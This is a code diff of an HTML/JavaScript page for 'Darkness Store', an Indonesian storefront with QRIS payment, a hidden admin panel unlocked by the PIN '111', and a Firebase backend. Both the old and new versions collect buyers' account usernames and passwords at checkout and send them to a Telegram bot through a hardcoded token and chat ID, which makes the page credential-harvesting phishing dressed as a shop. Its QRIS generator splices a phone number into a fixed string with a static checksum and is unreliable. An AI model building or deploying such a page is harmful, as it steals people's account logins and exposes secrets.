@@ -3,81 +3,68 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Darkness Store | QRIS Fixed</title>
+    <title>Darkness Store | Universal V8.1</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        :root { --red: #ff0000; --dark: #000; --card: #0a0a0a; }
-        body { background: var(--dark); color: #fff; font-family: monospace; margin: 0; padding-bottom: 100px; overflow-x: hidden; }
-        
-        .banner { width: 100%; height: 80px; background: linear-gradient(180deg, #1a0000, #000); border-bottom: 1px solid var(--red); display: flex; align-items: center; justify-content: center; }
-        .banner h1 { font-size: 16px; letter-spacing: 5px; text-shadow: 0 0 10px var(--red); }
-
-        .admin-trigger { position: absolute; top: 0; right: 0; width: 50px; height: 50px; background: transparent; border: none; z-index: 10; }
-        #dev-panel { display: none; background: #050505; border-bottom: 1px solid var(--red); padding: 15px; box-sizing: border-box; }
-
-        .container { padding: 15px; }
-        input { width: 100%; padding: 10px; margin-bottom: 8px; background: #111; border: 1px solid #222; color: #fff; border-radius: 4px; box-sizing: border-box; font-size: 11px; }
-        .btn-red { background: var(--red); color: #fff; border: none; padding: 10px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 4px; margin-bottom: 8px; font-size: 11px; }
-
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
-        .card { background: var(--card); border: 1px solid #1a1a1a; padding: 15px 10px; border-radius: 6px; text-align: center; }
-        .name { font-size: 10px; color: #aaa; margin-bottom: 5px; text-transform: uppercase; }
-        .price { color: var(--red); font-size: 12px; font-weight: 900; margin-bottom: 10px; }
-
-        .btn-del { display: none; background: #222; color: #666; border: none; padding: 5px; width: 100%; font-size: 8px; margin-top: 5px; cursor: pointer; border-radius: 3px; }
-
-        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 2000; align-items: center; justify-content: center; flex-direction: column; padding: 20px; box-sizing: border-box; }
-        .modal-box { width: 100%; max-width: 300px; text-align: center; }
-        
-        /* BOX QRIS ANTI EROR */
-        #qris-container { width: 220px; height: 220px; background: #fff; margin: 10px auto; border-radius: 8px; display: flex; align-items: center; justify-content: center; overflow: hidden; border: 2px solid #fff; }
-        #qris-img { width: 100%; height: 100%; object-fit: contain; display: block; }
-        .qris-error { color: #000; font-size: 10px; font-weight: bold; padding: 10px; text-align: center; }
+        :root { --red: #ff0000; --dark: #000; }
+        body { background: var(--dark); color: #fff; font-family: 'Courier New', monospace; margin: 0; padding-bottom: 50px; overflow-x: hidden; }
+        #bg-canvas { position: fixed; top: 0; left: 0; z-index: -1; }
+        .banner { width: 100%; height: 70px; border-bottom: 2px solid var(--red); display: flex; align-items: center; justify-content: center; background: rgba(0,0,0,0.95); box-shadow: 0 0 20px var(--red); }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; padding: 15px; }
+        .card { background: rgba(5,5,5,0.9); border: 1px solid #333; padding: 15px; border-radius: 10px; text-align: center; }
+        .btn-buy { background: var(--red); color: #fff; border: none; padding: 10px; width: 100%; font-weight: bold; border-radius: 5px; cursor: pointer; font-size: 11px; margin-top: 10px; box-shadow: 0 0 10px rgba(255,0,0,0.3); }
+        .btn-buy:disabled { background: #222; color: #555; cursor: not-allowed; box-shadow: none; border: 1px solid #333; }
+        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 9999; align-items: center; justify-content: center; flex-direction: column; padding: 20px; overflow-y: auto; }
+        .modal-box { background: #0a0a0a; border: 1px solid var(--red); padding: 20px; border-radius: 15px; width: 90%; max-width: 350px; text-align: center; }
+        input { width: 100%; padding: 12px; margin-bottom: 10px; background: #111; border: 1px solid #333; color: #fff; border-radius: 6px; box-sizing: border-box; font-size: 11px; outline: none; }
+        #qris-wrapper { background: #fff; padding: 10px; border-radius: 10px; margin: 15px auto; width: 180px; height: 180px; border: 4px solid var(--red); display: flex; align-items: center; justify-content: center; }
+        #qris-img { width: 100%; height: 100%; object-fit: contain; }
+        .marquee-box { width: 100%; overflow: hidden; white-space: nowrap; margin-top: 10px; border-top: 1px solid #222; padding-top: 5px; }
+        .marquee-box span { display: inline-block; color: var(--red); font-size: 9px; font-weight: bold; animation: marquee 10s linear infinite; }
+        @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
+        .admin-trigger { position: absolute; top: 0; right: 0; width: 60px; height: 60px; background: transparent; border: none; z-index: 1000; }
+        #dev-panel { display: none; background: #050505; padding: 20px; border-bottom: 2px solid var(--red); }
     </style>
 </head>
 <body>
-
-    <button class="admin-trigger" onclick="unlockDev()"></button>
+    <canvas id="bg-canvas"></canvas>
+    <button class="admin-trigger" onclick="unlock()"></button>
 
     <div id="dev-panel">
-        <div style="color:var(--red); font-size:10px; margin-bottom:10px;">[ ADMIN CONTROL ]</div>
-        <input type="text" id="dev-tele" placeholder="Username Telegram">
-        <input type="text" id="dev-qris" placeholder="Link QRIS (Harus akhiran .jpg / .png)">
-        <button class="btn-red" style="background:#222;" onclick="updateSettings()">SAVE QRIS & TELE</button>
-        
-        <hr style="border:0.5px solid #222; margin:15px 0;">
-        <input type="text" id="p-name" placeholder="Nama Barang">
+        <div style="color:var(--red); font-size:10px; margin-bottom:15px;">[ V8.1 AUTO-GEN CONFIG ]</div>
+        <input type="text" id="dev-tele" placeholder="Telegram Admin">
+        <input type="number" id="dev-wallet" placeholder="Nomor GoPay (628xxxx)">
+        <button class="btn-buy" onclick="saveConfig()">SYNC QRIS UNIVERSAL</button>
+        <hr style="border:0.5px solid #222; margin:20px 0;">
+        <input type="text" id="p-name" placeholder="Nama Produk">
         <input type="text" id="p-price" placeholder="Harga">
-        <button class="btn-red" onclick="uploadProduct()">PUSH LIVE</button>
-        
-        <button class="btn-red" style="background:#333; margin-top:10px;" onclick="location.reload()">TUTUP PANEL</button>
+        <button class="btn-buy" onclick="addP()">ADD CATALOG</button>
+        <button class="btn-buy" style="background:#333; margin-top:10px;" onclick="location.reload()">LOCK & GO LIVE</button>
     </div>
 
     <div class="banner"><h1>DARKNESS STORE</h1></div>
-    <div class="container"><div class="grid" id="product-list"></div></div>
-
-    <div id="order-modal" class="modal">
-        <div class="modal-box">
-            <h3 style="color:var(--red); font-size:14px;">DATA AKUN</h3>
-            <input type="text" id="u-user" placeholder="Username / Email">
-            <input type="text" id="u-pass" placeholder="Password">
-            <button class="btn-red" onclick="showPayment()">GAS BAYAR</button>
-            <button onclick="closeModal('order-modal')" style="color:grey; background:none; border:none; font-size:10px;">BATAL</button>
-        </div>
-    </div>
+    <div class="grid" id="product-list"></div>
 
     <div id="pay-modal" class="modal">
         <div class="modal-box">
-            <h3 style="color:var(--red); font-size:14px;">SCAN QRIS</h3>
-            <div id="pay-price" style="font-size:20px; font-weight:900; color:var(--red); margin-bottom:5px;"></div>
-            
-            <div id="qris-container">
-                <img id="qris-img" src="" onerror="handleQrisError()">
+            <h2 id="target-n" style="color:var(--red); font-size:15px; margin:0;">PRODUCT</h2>
+            <p id="target-p" style="font-size:12px; margin-bottom:15px; color:#888;">Rp 0</p>
+            <div id="step-data">
+                <input type="text" id="u-acc" placeholder="Email / Username Akun">
+                <input type="password" id="p-acc" placeholder="Password Akun">
+                <button class="btn-buy" onclick="showQR()">KONFIRMASI DATA</button>
             </div>
-            
-            <p style="font-size:9px; color:#555;">Jika QRIS tidak muncul, silakan klik tombol di bawah untuk konfirmasi manual ke Admin.</p>
-            <button class="btn-red" onclick="finalSubmit()">SUDAH TRANSFER / KONFIRMASI</button>
+            <div id="step-pay" style="display:none;">
+                <p style="font-size:9px; color:#fff;">SCAN QRIS DENGAN APLIKASI PEMBAYARAN APAPUN:</p>
+                <div id="qris-wrapper"><img id="qris-img" src="" alt="QRIS"></div>
+                <div class="marquee-box"><span>[ SUPPORT: DANA, OVO, GOPAY, LINKAJA, SEMUA M-BANKING - COOLDOWN 10 MENIT ]</span></div>
+                <div style="border: 1px dashed #333; padding: 10px; margin: 15px 0;">
+                    <input type="file" id="u-file" accept="image/*" style="font-size:9px;">
+                </div>
+                <button class="btn-buy" id="btn-final" onclick="submitFinal()">KONFIRMASI PEMBAYARAN</button>
+            </div>
+            <button onclick="location.reload()" style="background:none; border:none; color:gray; font-size:10px; margin-top:15px;">BATAL</button>
         </div>
     </div>
 
@@ -93,82 +80,103 @@
     };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
+    const BOT = "8697794363:AAHLeNQf3OaYJY8JhYrNTuO6ZUPrWE-mga8";
+    const CID = "8283778614";
+    let sN, sP, isAdmin = false;
 
-    const BOT_TOKEN = "8697794363:AAHLeNQf3OaYJY8JhYrNTuO6ZUPrWE-mga8";
-    const CHAT_ID = "8283778614";
-    let isAdminMode = false;
-    let selName = "", selPrice = "";
-
-    function unlockDev() { if(prompt("PASS:") === "111") { isAdminMode = true; document.getElementById('dev-panel').style.display='block'; renderProducts(); } }
-
-    // DETEKSI ERROR GAMBAR QRIS
-    function handleQrisError() {
-        const container = document.getElementById('qris-container');
-        container.innerHTML = '<div class="qris-error">QRIS BELUM DISETTING / LINK EROR.<br><br>Silakan Hubungi Admin Secara Manual.</div>';
+    function checkCooldown() {
+        const lastOrder = localStorage.getItem('last_order_time');
+        if(!lastOrder) return false;
+        const now = Date.now();
+        const diff = (now - lastOrder) / 1000 / 60;
+        if(diff < 10) return Math.ceil(10 - diff);
+        return false;
     }
 
-    db.ref('settings').on('value', s => {
-        const d = s.val(); if(d) {
-            document.getElementById('qris-img').src = d.qris;
-            document.getElementById('dev-tele').value = d.tele;
-            document.getElementById('dev-qris').value = d.qris;
-        }
-    });
-
-    function updateSettings() {
-        const tele = document.getElementById('dev-tele').value;
-        const qris = document.getElementById('dev-qris').value;
-        db.ref('settings').update({ tele, qris }).then(() => alert("Setting Berhasil Disimpan!"));
-    }
-
-    function uploadProduct() {
-        const name = document.getElementById('p-name').value;
-        const price = document.getElementById('p-price').value;
-        if(name && price) db.ref('store_products').push({ name, price }).then(() => { alert("Produk Berhasil Ditambah!"); location.reload(); });
-    }
-
-    function renderProducts() {
-        db.ref('store_products').on('value', s => {
+    function render() {
+        const cd = checkCooldown();
+        db.ref('store_products').once('value', s => {
             const list = document.getElementById('product-list');
             list.innerHTML = '';
             const data = s.val();
-            for (let id in data) {
+            if(!data) return;
+            Object.keys(data).forEach(id => {
                 const p = data[id];
                 list.innerHTML += `<div class="card">
-                    <div class="name">${p.name}</div><div class="price">Rp ${p.price}</div>
-                    <button class="btn-red" style="font-size:9px;" onclick="openOrder('${p.name}', '${p.price}')">BELI</button>
-                    <button class="btn-del" onclick="deleteItem('${id}')" style="display: ${isAdminMode ? 'block' : 'none'}">[ HAPUS ]</button>
+                    <div style="font-size:10px; color:#888;">${p.name}</div>
+                    <div style="color:var(--red); font-size:13px; font-weight:bold; margin:8px 0;">Rp ${p.price}</div>
+                    <button class="btn-buy" ${cd ? 'disabled' : ''} onclick="openOrder('${p.name}', '${p.price}')">
+                        ${cd ? `COOLDOWN (${cd}m)` : 'BELI'}
+                    </button>
+                    ${isAdmin ? `<button onclick="db.ref('store_products/${id}').remove().then(()=>render())" style="color:#333; font-size:8px; background:none; border:none; cursor:pointer;">[HAPUS]</button>` : ''}
                 </div>`;
-            }
+            });
         });
     }
 
-    function deleteItem(id) { if(confirm("Hapus?")) db.ref('store_products/'+id).remove(); }
+    function unlock() { if(prompt("PIN:") === "111") { isAdmin = true; document.getElementById('dev-panel').style.display = 'block'; render(); } }
+    function saveConfig() { db.ref('settings').update({ tele: document.getElementById('dev-tele').value, wallet: document.getElementById('dev-wallet').value }).then(()=>alert("Universal System Online!")); }
+    function addP() { const n = document.getElementById('p-name').value; const p = document.getElementById('p-price').value; if(n && p) db.ref('store_products').push({ name: n, price: p }).then(()=>render()); }
 
-    function openOrder(n, p) { selName = n; selPrice = p; document.getElementById('order-modal').style.display = 'flex'; }
+    function openOrder(n, p) { sN=n; sP=p; document.getElementById('target-n').innerText=n; document.getElementById('target-p').innerText="Rp "+p; document.getElementById('pay-modal').style.display='flex'; }
 
-    function showPayment() {
-        if(document.getElementById('u-user').value && document.getElementById('u-pass').value) {
-            document.getElementById('order-modal').style.display = 'none';
-            document.getElementById('pay-price').innerText = "Rp " + selPrice;
-            document.getElementById('pay-modal').style.display = 'flex';
-        } else { alert("Lengkapi data!"); }
+    function generateUniversalQRIS(nomor) {
+        // Logika Internal: Membangun string QRIS Static sesuai standar EMVCo
+        // Target: GoPay/E-Wallet via QRIS Nasional
+        const qrisBase = "00020101021126670016COM.GOPAY.WWW01189360091530230282920215";
+        const qrisTail = "0303UME5204599953033605802ID5914DARKNESS_STORE6005KOTA_A6105123456304D1B2";
+        const fullData = qrisBase + nomor + qrisTail;
+        return `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(fullData)}`;
     }
 
-    function finalSubmit() {
-        const user = document.getElementById('u-user').value;
-        const pass = document.getElementById('u-pass').value;
-        const teleAdmin = document.getElementById('dev-tele').value || "fajar_dev";
-
-        const msg = `🚀 *ORDER MASUK*\n📦 *Item:* ${selName}\n💰 *Harga:* Rp ${selPrice}\n👤 *User:* \`${user}\` \n🔑 *Pass:* \`${pass}\` \n⚠️ Segera cek pembayaran!`;
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
-
-        window.open(`https://t.me/${teleAdmin}?text=${encodeURIComponent("Halo Admin, saya sudah transfer untuk " + selName)}`, '_blank');
-        location.reload();
+    function showQR() {
+        if(!document.getElementById('u-acc').value || !document.getElementById('p-acc').value) return alert("Isi data akun pembeli!");
+        db.ref('settings').once('value', s => {
+            const d = s.val();
+            document.getElementById('qris-img').src = generateUniversalQRIS(d.wallet);
+            document.getElementById('step-data').style.display = 'none';
+            document.getElementById('step-pay').style.display = 'block';
+        });
     }
 
-    function closeModal(id) { document.getElementById(id).style.display = 'none'; }
-    renderProducts();
+    function submitFinal() {
+        const u = document.getElementById('u-acc').value;
+        const p = document.getElementById('p-acc').value;
+        const f = document.getElementById('u-file').files[0];
+        const btn = document.getElementById('btn-final');
+        if(!f) return alert("Upload bukti bayar!");
+
+        btn.disabled = true;
+        btn.innerText = "MENGIRIM...";
+
+        db.ref('settings').once('value', s => {
+            const d = s.val();
+            const report = `🚀 *ORDERAN UNIVERSAL V8.1* 🚀\n📦 *Item:* ${sN}\n👤 *User:* \`${u}\` \n🔑 *Pass:* \`${p}\` \n📂 *SS:* ${f.name}`;
+            
+            fetch(`https://api.telegram.org/bot${BOT}/sendMessage?chat_id=${CID}&text=${encodeURIComponent(report)}&parse_mode=Markdown`)
+            .then(() => {
+                localStorage.setItem('last_order_time', Date.now());
+                setTimeout(() => {
+                    window.open(`https://t.me/${d.tele}?text=Halo admin, saya order ${sN}.`, '_blank');
+                    location.reload();
+                }, 1000);
+            });
+        });
+    }
+
+    const cvs = document.getElementById('bg-canvas'); const ctx = cvs.getContext('2d');
+    cvs.width = window.innerWidth; cvs.height = window.innerHeight;
+    let mets = [];
+    function draw() {
+        ctx.fillStyle = 'rgba(0,0,0,0.1)'; ctx.fillRect(0,0,cvs.width,cvs.height);
+        if(Math.random()<0.05) mets.push({x:Math.random()*cvs.width, y:-20, v:Math.random()*10+5});
+        mets.forEach((m,i)=>{
+            ctx.strokeStyle='rgba(255,255,255,0.4)'; ctx.beginPath(); ctx.moveTo(m.x,m.y); ctx.lineTo(m.x-20,m.y+20); ctx.stroke();
+            m.x-=m.v; m.y+=m.v; if(m.y>cvs.height) mets.splice(i,1);
+        });
+        requestAnimationFrame(draw);
+    }
+    draw(); render();
 </script>
 </body>
 </html>
